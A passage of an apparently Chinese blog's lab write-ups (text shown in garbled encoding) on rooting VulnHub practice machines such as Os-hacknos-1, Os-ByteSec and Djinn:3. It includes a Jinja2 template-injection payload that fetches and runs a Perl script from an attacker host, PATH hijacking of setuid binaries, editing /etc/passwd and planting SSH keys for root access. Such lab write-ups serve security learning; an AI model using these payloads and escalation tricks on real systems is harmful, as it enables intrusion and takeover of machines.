masta</code>ï¼ˆå¦ä¸€ä¸ªä¹Ÿæœ‰ï¼Œè¿™é‡Œä¸ä¸¾ä¾‹äº†ï¼‰</p><img src="symfonos:1/image-20200727214742013.png" alt="image-20200727214742013" style="zoom:50%;" /><p>å‘ç°äº†æœ‰æ¼æ´ï¼Œè€Œä¸”ç‰ˆæœ¬ç¬¦åˆï¼Œé‚£ä¹ˆçœ‹ä¸€ä¸‹expæ€ä¹ˆè¯´çš„</p><img src="symfonos:1/image-20200727214918852.png" alt="image-20200727214918852" style="zoom:50%;" /><p>å»è¯•è¯•çœ‹</p><img src="symfonos:1/image-20200727214955809.png" alt="image-20200727214955809" style="zoom:50%;" /><p>å‘ç°äº†ç¡®å®å­˜åœ¨è¿™ä¸ªEFIæ¼æ´</p><p>æœ¬æ¥æƒ³ä½¿ç”¨logæ–‡ä»¶åŒ…å«åå¼¹ä¸€ä¸ªshellçš„ï¼Œå‘ç°ä¸çŸ¥é“logæ–‡ä»¶åœ¨å“ªé‡Œ</p><p>ï¼ˆç¿»äº†ç¿»å‚è€ƒç­”æ¡ˆï¼‰å¾—çŸ¥å¯ä»¥ä½¿ç”¨<code>/var/mail/helios</code>ï¼ˆå› ä¸ºå¼€å¯äº†smtpæœåŠ¡ï¼Œå¯ä»¥å‘é€é‚®ä»¶ï¼‰</p><p>ä½¿ç”¨telnetå‘é€é‚®ä»¶</p><p><code>telnet 192.168.2.177 25</code></p><img src="symfonos:1/image-20200727215346802.png" alt="image-20200727215346802" style="zoom:50%;" /><p>ç„¶åä½¿ç”¨EFIï¼Œæœ¬åœ°ç›‘å¬ï¼Œå¾—åˆ°ä¸€ä¸ªshell</p><img src="symfonos:1/image-20200727215536502.png" alt="image-20200727215536502" style="zoom:50%;" /><p>ç„¶åæ‰¾ææƒçš„ä¸œè¥¿ï¼Œ</p><img src="symfonos:1/image-20200727215647621.png" alt="image-20200727215647621" style="zoom:50%;" /><p>ä»–çš„ç”»é£å’Œåˆ«äººä¸ä¸€æ ·ï¼ˆé›¾ï¼‰</p><p>æŠŠå®ƒä¸‹è½½ä¸‹æ¥åç¼–è¯‘ä¸€ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 command; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line"></span><br><span class="line">  command = &#x27; I- lruc&#x27;;</span><br><span class="line">  v5 = &#x27;l//:ptth&#x27;;</span><br><span class="line">  v6 = &#x27;tsohlaco&#x27;;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  system((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;command);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å€’è¿‡æ¥çœ‹ï¼ˆå°ç«¯åºï¼‰å‘½ä»¤æ˜¯<code>curl -I http://localhost</code></p><p>é‚£å°±åŠ«æŒ<code>curl</code></p><img src="symfonos:1/image-20200727215918476.png" alt="image-20200727215918476" style="zoom:50%;" /><p>åœ¨<code>/tmp</code>ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ª<code>curl</code>æ–‡ä»¶</p><img src="symfonos:1/image-20200727220006160.png" alt="image-20200727220006160" style="zoom:50%;" /><p>ç„¶åè¿è¡Œ<code>/opt/statuscheck</code></p><img src="symfonos:1/image-20200727220035574.png" alt="image-20200727220035574" style="zoom:50%;" /><p>å¾—åˆ°äº†rootæƒé™</p>]]></content>
      
      
      <categories>
          
          <category> exploit </category>
          
          <category> symfonos </category>
          
      </categories>
      
      
        <tags>
            
            <tag> exploit </tag>
            
            <tag> wordpress </tag>
            
            <tag> smb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub hacks:Os-hacknos-1é¶æœº</title>
      <link href="/Os-hacknos.html"/>
      <url>/Os-hacknos.html</url>
      
        <content type="html"><![CDATA[<p>vulnhubé‡Œçš„ nezikochan é¶æœº</p><p>ç®€å•/ä¸­ç­‰éš¾åº¦</p><a id="more"></a><h1 id="Os-hacknos-1"><a href="#Os-hacknos-1" class="headerlink" title="Os-hacknos-1"></a>Os-hacknos-1</h1><p>é¶æœºçš„ipåœ°å€ä¸º<code>192.168.2.175</code></p><p>å¼€æ”¾ç«¯å£<code>22 80</code></p><h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>è®¿é—®ä¹‹åçš„é¡µé¢æ˜¯ä¸€ä¸ªé»˜è®¤é¡µé¢</p><img src="hacknos:Os-hacknos:1/image-20200726154227817.png" alt="image-20200726154227817" style="zoom:50%;" /><p>æ‰«æä¸€ä¸‹ç›®å½•</p><p><code>dirb http://192.168.2.175 /usr/share/wordlist/dirb/big.txt</code></p><p><img src="hacknos:Os-hacknos:1/image-20200726154358206.png" alt="image-20200726154358206"></p><p>å‘ç°æ˜¯ä¸€ä¸ª<code>drupal</code>çš„ç½‘ç«™</p><p>è¿›å»è®¿é—®ä¹‹åï¼Œä¹Ÿæ²¡æœ‰å•¥ä¸œè¥¿</p><img src="hacknos:Os-hacknos:1/image-20200726154431342.png" alt="image-20200726154431342" style="zoom:50%;" /><p>å°è¯•ä½¿ç”¨<code>msfconsole</code>çš„<code>search</code>å¯»æ‰¾ä¸€ä¸‹</p><p>è¿™é‡Œé€‰ç”¨çš„æ˜¯</p><img src="hacknos:Os-hacknos:1/image-20200726154657427.png" alt="image-20200726154657427" style="zoom:50%;" /><p>è®¾ç½®ä¸€ä¸‹å‚æ•°</p><img src="hacknos:Os-hacknos:1/image-20200726154856710.png" alt="image-20200726154856710" style="zoom:50%;" /><p>çœ‹åˆ°å‡ºç°äº†<code>opened</code>è¡¨ç¤ºæˆåŠŸäº†</p><img src="hacknos:Os-hacknos:1/image-20200726155014184.png" alt="image-20200726155014184" style="zoom:50%;" /><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>å¾—åˆ°shellä¹‹åï¼Œåœ¨<code>../</code>(<code>/var/www/</code>)ç›®å½•ä¸‹å‘ç°äº†ä¸€ä¸ª</p><img src="hacknos:Os-hacknos:1/image-20200726155224282.png" alt="image-20200726155224282" style="zoom:50%;" /><p>é‡Œé¢æ˜¯ä¸€æ®µbase64</p><p>è§£å¯†å‡ºæ¥ä¹‹åæ˜¯ä¸€æ®µ<code>brain fuck</code></p><img src="hacknos:Os-hacknos:1/image-20200726155315147.png" alt="image-20200726155315147" style="zoom:50%;" /><p>å†æ¬¡è§£å¯†ä¹‹å</p><img src="hacknos:Os-hacknos:1/image-20200726155718450.png" alt="image-20200726155718450" style="zoom:50%;" /><p>å¾—åˆ°äº†<code>james</code>çš„å¯†ç æ˜¯<code>Hacker@4514</code></p><p>ä½¿ç”¨sshè¿æ¥ï¼Œå‘ç°å¹¶ä¸å¯ä»¥ï¼Œsuä¹Ÿä¸èƒ½åˆ‡æ¢</p><img src="hacknos:Os-hacknos:1/image-20200726160048138.png" alt="image-20200726160048138" style="zoom:50%;" /><img src="hacknos:Os-hacknos:1/image-20200726160058487.png" alt="image-20200726160058487" style="zoom:50%;" /><p>é‚£åªèƒ½ç»§ç»­æ‰¾ææƒçš„ä¸œè¥¿</p><img src="hacknos:Os-hacknos:1/image-20200726160159528.png" alt="image-20200726160159528" style="zoom:50%;" /><p>å‘ç°<code>wget</code>æœ‰<code>setuid</code>æƒé™ï¼Œå¯ä»¥ç”¨å®ƒå†™å…¥<code>/root/.ssh/</code>(ä½†æ˜¯å¹¶æ²¡æœ‰è¿™ä¸ªç›®å½•)</p><p>è€ƒè™‘ä½¿ç”¨<code>/etc/passwd</code>ï¼Œå…ˆæŠŠé‡Œé¢çš„å†…å®¹æ‹·è´åˆ°ä¸€ä¸ªæ–‡ä»¶é‡Œï¼Œç„¶åä½¿ç”¨opensslç”Ÿæˆä¸€ä¸ªå¯†ç ï¼ŒåŠ å…¥è´¦æˆ·ä¸­</p><img src="hacknos:Os-hacknos:1/image-20200726160550053.png" alt="image-20200726160550053" style="zoom:50%;" /><p>ç„¶åä»¿ç…§rootçš„é‚£ä¸€è¡Œå†™å°±è¡Œ</p><p>ä½¿ç”¨suï¼Œææƒåˆ°root</p><img src="hacknos:Os-hacknos:1/image-20200726160636869.png" alt="image-20200726160636869" style="zoom:50%;" />]]></content>
      
      
      <categories>
          
          <category> exploit </category>
          
          <category> hacknos </category>
          
      </categories>
      
      
        <tags>
            
            <tag> exploit </tag>
            
            <tag> drupal </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub hacks:Os-ByteSecé¶æœº</title>
      <link href="/Os-ByteSec.html"/>
      <url>/Os-ByteSec.html</url>
      
        <content type="html"><![CDATA[<p>vulnhubé‡Œçš„ nezikochan é¶æœº</p><p>ä¸­ç­‰éš¾åº¦</p><a id="more"></a><h1 id="Os-ByteSec"><a href="#Os-ByteSec" class="headerlink" title="Os-ByteSec"></a>Os-ByteSec</h1><p>ä¸»æœºæ‰«æ/ç«¯å£æ‰«æ</p><p>å¼€å¯äº†<code>80 139 445 2525</code>ç«¯å£</p><p>å…¶ä¸­2525ç«¯å£æ˜¯sshï¼Œ139å’Œ445ç«¯å£æ˜¯smb</p><h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œæ‰«æç›®å½•ä¹Ÿæ²¡æœ‰å•¥ä¸œè¥¿</p><img src="hacknos:Os-ByteSec/image-20200722142948147.png" alt="image-20200722142948147" style="zoom:50%;" /><p>åªæœ‰æœ€ä¸‹é¢æç¤º<code>smb</code></p><h2 id="smb"><a href="#smb" class="headerlink" title="smb"></a>smb</h2><p>ä½¿ç”¨<code>enum4linux</code>æšä¸¾ä¸€ä¸‹ç›®æ ‡é¶æœºçš„è´¦æˆ·</p><p><code>enum4linux -U 192.168.2.174</code></p><img src="hacknos:Os-ByteSec/image-20200722143305838.png" alt="image-20200722143305838" style="zoom:50%;" /><p>å¾—åˆ°äº†ä¸€ä¸ªåä¸º<code>smb</code>çš„ç”¨æˆ·</p><p>ä½¿ç”¨<code>msf</code>çš„<code>auxiliary/scanner/smb/smb_login </code>æ¨¡å—å»çˆ†ç ´å¯†ç </p><img src="hacknos:Os-ByteSec/image-20200722143604720.png" alt="image-20200722143604720" style="zoom:50%;" /><p>ï¼ˆå…¶å®æ¨èç”¨<code>fastattack.txt</code>å­—å…¸ï¼‰</p><p>å¾—åˆ°äº†å¯†ç ä¸ºç©º</p><img src="hacknos:Os-ByteSec/image-20200722143630970.png" alt="image-20200722143630970" style="zoom:50%;" /><p>ä½¿ç”¨<code>smbclient</code>ç™»å½•smb</p><img src="hacknos:Os-ByteSec/image-20200722143725552.png" alt="image-20200722143725552" style="zoom:50%;" /><p>å‘ç°å¹¶æ²¡æœ‰å•¥ä¸œè¥¿ï¼Ÿï¼Ÿï¼Ÿ</p><p>ï¼ˆç¿»äº†å‚è€ƒç­”æ¡ˆï¼‰</p><p>å‘ç°åœ¨<code>192.168.2.174/smb</code>ç›®å½•ä¸‹æœ‰ä¸œè¥¿ï¼ˆä¸ºä»€ä¹ˆï¼Ÿï¼‰</p><img src="hacknos:Os-ByteSec/image-20200722143822912.png" alt="image-20200722143822912" style="zoom:50%;" /><p>ä¸‹è½½ä¸‹æ¥ä¹‹åï¼Œ<code>main.txt</code>æ²¡ä¸œè¥¿ï¼Œ<code>safe.zip</code>éœ€è¦å¯†ç </p><h2 id="fcrackzip"><a href="#fcrackzip" class="headerlink" title="fcrackzip"></a>fcrackzip</h2><p>ä½¿ç”¨<code>fcrackzip</code>ç ´è§£</p><img src="hacknos:Os-ByteSec/image-20200722144000639.png" alt="image-20200722144000639" style="zoom:50%;" /><p>å¾—åˆ°äº†å¯†ç </p><p>è§£å‹ä¹‹åå¾—åˆ°ä¸€ä¸ª<code>.cap</code>ï¼ˆæµé‡åŒ…ï¼‰ï¼Œä½¿ç”¨<code>wireshark</code>åˆ†æä¹‹åå‘ç°æ˜¯ä¸€ä¸ªæ— çº¿æµé‡åŒ…ï¼ˆå‚è€ƒç­”æ¡ˆè¯´çš„ï¼‰</p><h2 id="aircrack-ng"><a href="#aircrack-ng" class="headerlink" title="aircrack-ng"></a>aircrack-ng</h2><p>ä½¿ç”¨<code>aircrack-ng</code>ç ´è§£</p><img src="hacknos:Os-ByteSec/image-20200722144157918.png" alt="image-20200722144157918" style="zoom:50%;" /><p>ç ´è§£ä¹‹åå¾—åˆ°äº†<code>blackjax</code>ç”¨æˆ·å’Œå¯†ç </p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>ä½¿ç”¨sshè¿æ¥ï¼Œç›®å½•ä¸‹é¢æœ‰ä¸€ä¸ª<code>user.txt</code>ï¼Œæ˜¯ä¸€ä¸ªflag</p><p>ç„¶åæ‰¾ææƒçš„ä¸œè¥¿</p><p><code>find -perm -u=s -type f 2&gt;/dev/null</code></p><img src="hacknos:Os-ByteSec/image-20200722144457227.png" alt="image-20200722144457227" style="zoom:50%;" /><p>å‘ç°è¿™ä¸ª<code>netscan</code>ï¼ˆåˆ«äººçš„è§£é¢˜æ­¥éª¤ä¸Šé¢ç›´æ¥è¯´å¯ç–‘ç„¶åä¸€çœ¼çœ‹å‡ºæ¥è¯¥æ€ä¹ˆåšæˆ‘æ˜¯æ²¡æƒ³åˆ°çš„ï¼‰</p><p>ä½¿ç”¨<code>cat</code>å‘½ä»¤æŸ¥çœ‹ä¸€ä¸‹æ˜¯ä»€ä¹ˆç±»å‹æ–‡ä»¶</p><img src="hacknos:Os-ByteSec/image-20200722144617102.png" alt="image-20200722144617102" style="zoom:50%;" /><p>çœ‹è¿™ä¸ªæ–‡ä»¶å¤´ï¼Œæ˜¯ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼ˆä¸æ˜¯shellè„šæœ¬ï¼‰</p><p>ä½¿ç”¨ida(32ä½)åç¼–è¯‘</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setuid(<span class="number">0</span>);</span><br><span class="line">  setgid(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;netstat -antp&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªæ–‡ä»¶ç›´æ¥è¿è¡Œäº†<code>netstat</code>å‘½ä»¤</p><p>æ ¹æ®Linuxå‘½ä»¤çš„ç‰¹æ€§ï¼Œä½¿ç”¨<code>export PATH=/tmp:$PATH</code>åŠ«æŒpathï¼Œç„¶ååˆ›å»º<code>/tmp/netstat</code>æ–‡ä»¶ï¼Œè¿™æ ·è¿è¡Œ<code>netscan</code>çš„æ—¶å€™ä¼šè¿è¡Œ<code>/tmp/netstat</code>ç¨‹åºã€‚</p><img src="hacknos:Os-ByteSec/image-20200722144949356.png" alt="image-20200722144949356" style="zoom:50%;" /><p>å¹¶ä¸”ä½¿ç”¨<code>chmod 777 /tmp/netstat</code>ç»™æƒé™</p><img src="hacknos:Os-ByteSec/image-20200722145130078.png" alt="image-20200722145130078" style="zoom:50%;" /><p>å¾—åˆ°äº†rootæƒé™</p>]]></content>
      
      
      <categories>
          
          <category> exploit </category>
          
          <category> hacknos </category>
          
      </categories>
      
      
        <tags>
            
            <tag> exploit </tag>
            
            <tag> smb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub Djinn:3é¶æœº</title>
      <link href="/Djinn-3.html"/>
      <url>/Djinn-3.html</url>
      
        <content type="html"><![CDATA[<p>vulnhubé‡Œçš„ Djinn:3é¶æœº</p><p>ä¸­ç­‰éš¾åº¦</p><a id="more"></a><h1 id="Djinn-3"><a href="#Djinn-3" class="headerlink" title="Djinn:3"></a>Djinn:3</h1><img src="./Djinn:3/image-20200721185630379.png" alt="image-20200721185630379" style="zoom:50%;" /><p>ç«¯å£æ‰«æï¼Œå‘ç°å¼€å¯äº†<code>22 80 5000 31337</code>ç«¯å£</p><h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><img src="./Djinn:3/image-20200721185744321.png" alt="image-20200721185744321" style="zoom:50%;" /><p>å•¥ä¹Ÿæ²¡æœ‰ï¼Œä¸Šé¢çš„æŒ‰é’®ä¹Ÿå•¥éƒ½ä¸ä¼šåšï¼Œç”šè‡³æ²¡æœ‰<code>robots.txt</code></p><h2 id="5000"><a href="#5000" class="headerlink" title="5000"></a>5000</h2><img src="./Djinn:3/image-20200721190056128.png" alt="image-20200721190056128" style="zoom:50%;" /><p>ä¹ä¸€çœ‹æ²¡ä»€ä¹ˆå¸®åŠ©ï¼Œå…¶å®æåˆ°äº†ä¸€ä¸ª<code>guest</code>ç”¨æˆ·</p><h2 id="31337"><a href="#31337" class="headerlink" title="31337"></a>31337</h2><p>ncä¹‹å</p><img src="Djinn:3/image-20200721190206973.png" alt="image-20200721190206973" style="zoom:50%;" /><p>ä½¿ç”¨<code>guest</code>ç™»å½•</p><img src="Djinn:3/image-20200721190453517.png" alt="image-20200721190453517" style="zoom:50%;" /><p><code>update</code>æ˜¾ç¤ºæ²¡æœ‰æƒé™</p><p><code>open</code>å¢åŠ äº†ä¸€æ¡ä¹‹åå‘ç°5000ç«¯å£å¢åŠ äº†ä¸€æ¡æ•°æ®ï¼Œå°è¯•å‘½ä»¤æ³¨å…¥æ²¡æˆåŠŸ</p><p>ï¼ˆæŸ¥å‚è€ƒç­”æ¡ˆï¼‰</p><p>åå°æ˜¯ä¸€ä¸ª<code>flask(Jinja2)</code>ï¼Œå­˜åœ¨ä¸€ä¸ªæ¨¡æ¿æ³¨å…¥æ¼æ´</p><p>payloadå¦‚ä¸‹(æŠ„çš„)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;request|attr(<span class="string">&#x27;application&#x27;</span>)|attr(<span class="string">&#x27;\x5f\x5fglobals\x5f\x5f&#x27;</span>)|attr(<span class="string">&#x27;\x5f\x5fgetitem\x5f\x5f&#x27;</span>)(<span class="string">&#x27;\x5f\x5fbuiltins\x5f\x5f&#x27;</span>)|attr(<span class="string">&#x27;\x5f\x5fgetitem\x5f\x5f&#x27;</span>)(<span class="string">&#x27;\x5f\x5fimport\x5f\x5f&#x27;</span>)(<span class="string">&#x27;os&#x27;</span>)|attr(<span class="string">&#x27;popen&#x27;</span>)(<span class="string">&#x27;wget http://192.168.0.107/perl.pl;perl perl.pl&#x27;</span>)|attr(<span class="string">&#x27;read&#x27;</span>)()&#125;&#125;</span><br></pre></td></tr></table></figure><p>è®¿é—®ä¹‹åï¼Œå¾—åˆ°äº†ä¸€ä¸ªshell</p><img src="Djinn:3/image-20200721191529580.png" alt="image-20200721191529580" style="zoom:50%;" /><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>çœ‹ä¸€ä¸‹ç”¨æˆ·åˆ—è¡¨ï¼ˆå…¶ä¸­jasonå’Œstdoutæ˜¯åæ¥åˆ›å»ºçš„ï¼‰</p><img src="Djinn:3/image-20200721192149525.png" alt="image-20200721192149525" style="zoom:50%;" /><p>æ‰¾ä¸€ä¸‹<code>saint</code>ç”¨æˆ·çš„æ–‡ä»¶</p><p><code>find / -user saint -type f 2&gt;/dev/null</code></p><img src="Djinn:3/image-20200721192240006.png" alt="image-20200721192240006" style="zoom:50%;" /><p>ä¸‹è½½ä¸‹æ¥åç¼–è¯‘(uncompyle6)ä¹‹å</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os, sys, json</span><br><span class="line"><span class="keyword">from</span> glob <span class="keyword">import</span> glob</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime <span class="keyword">as</span> dt</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ConfigReader</span>:</span></span><br><span class="line">    config = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read_config</span>(<span class="params">path</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Reads the config file</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        config_values = &#123;&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> (f):</span><br><span class="line">                config_values = json.load(f)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                print(<span class="string">&quot;Couldn&#x27;t properly parse the config file. Please use properl&quot;</span>)</span><br><span class="line">                sys.exit(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">finally</span>:</span><br><span class="line">                e = <span class="literal">None</span></span><br><span class="line">                <span class="keyword">del</span> e</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> config_values</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set_config_path</span>():</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Set the config path</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        files = glob(<span class="string">&#x27;/home/saint/*.json&#x27;</span>)</span><br><span class="line">        other_files = glob(<span class="string">&#x27;/tmp/*.json&#x27;</span>)</span><br><span class="line">        files = files + other_files</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(files) &gt; <span class="number">2</span>:</span><br><span class="line">                files = files[:<span class="number">2</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                file1 = os.path.basename(files[<span class="number">0</span>]).split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">                file2 = os.path.basename(files[<span class="number">1</span>]).split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> file1[(-<span class="number">2</span>)] == <span class="string">&#x27;config&#x27;</span>:</span><br><span class="line">                    <span class="keyword">if</span> file2[(-<span class="number">2</span>)] == <span class="string">&#x27;config&#x27;</span>:</span><br><span class="line">                        a = dt.strptime(file1[<span class="number">0</span>], <span class="string">&#x27;%d-%m-%Y&#x27;</span>)</span><br><span class="line">                        b = dt.strptime(file2[<span class="number">0</span>], <span class="string">&#x27;%d-%m-%Y&#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> b &lt; a:</span><br><span class="line">                    filename = files[<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    filename = files[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> filename</span><br><span class="line"><span class="comment"># okay decompiling a.pyc</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> configuration <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> connectors.ftpconn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> connectors.sshconn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> connectors.utils <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Main function</span></span><br><span class="line"><span class="string">    Cron job is going to make my work easy peasy</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    configPath = ConfigReader.set_config_path()</span><br><span class="line">    config = ConfigReader.read_config(configPath)</span><br><span class="line">    connections = checker(config)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;FTP&#x27;</span> <span class="keyword">in</span> connections:</span><br><span class="line">        ftpcon(config[<span class="string">&#x27;FTP&#x27;</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;SSH&#x27;</span> <span class="keyword">in</span> connections:</span><br><span class="line">            sshcon(config[<span class="string">&#x27;SSH&#x27;</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;URL&#x27;</span> <span class="keyword">in</span> connections:</span><br><span class="line">                sync(config[<span class="string">&#x27;URL&#x27;</span>], config[<span class="string">&#x27;Output&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>å¤§æ„å°±æ˜¯åœ¨<code>/tmp</code>ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ª<code>day-month-year.config.json</code>çš„æ–‡ä»¶ï¼Œæ–‡ä»¶é‡Œé¢å†™<code>URL:xxxx; Output:xxx</code>ï¼Œå°±ä¼šæŠŠURLæŒ‡å‘çš„æ–‡ä»¶å†™å…¥åˆ°Outputä¸­</p><p>é‚£æŠŠsshå†™è¿›å»</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        <span class="attr">&quot;URL&quot;</span>:<span class="string">&quot;http://192.168.2.143/id_rsa.pub&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;Output&quot;</span>:<span class="string">&quot;/home/saint/.ssh/authorized_keys&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åç­‰ä¸€ä¼šå„¿å°±å¯ä»¥ä½¿ç”¨saintè´¦æˆ·å…å¯†ç™»å½•äº†</p><img src="Djinn:3/image-20200721194614312.png" alt="image-20200721194614312" style="zoom:50%;" /><p>æŸ¥çœ‹ä¸€ä¸‹<code>sudo -l</code></p><img src="Djinn:3/image-20200721194709463.png" alt="image-20200721194709463" style="zoom:50%;" /><p>é‚£å°±å¢åŠ ä¸€ä¸ªrootç”¨æˆ·ç»„çš„è´¦æˆ·</p><p><code>saint@djinn3:~$ sudo -u root /usr/sbin/adduser --gid 0 stdin</code></p><img src="Djinn:3/image-20200721195016035.png" alt="image-20200721195016035" style="zoom:50%;" 